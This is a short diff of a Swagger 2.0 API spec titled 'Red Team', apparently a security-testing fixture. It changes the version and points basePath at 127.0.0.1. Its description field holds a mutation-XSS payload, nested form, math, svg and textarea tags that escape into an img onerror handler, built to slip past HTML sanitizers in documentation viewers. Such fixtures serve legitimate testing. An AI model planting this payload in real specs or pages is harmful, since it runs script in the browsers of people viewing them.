@@ -1,11 +1,11 @@
 swagger: '2.0'
 info:
-  title: Red Team 2.0
+  title: Red Team 2.1
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
 
   version: production
-basePath: /
+basePath: https://127.0.0.1/
 produces:
   - application/xml
   - application/json
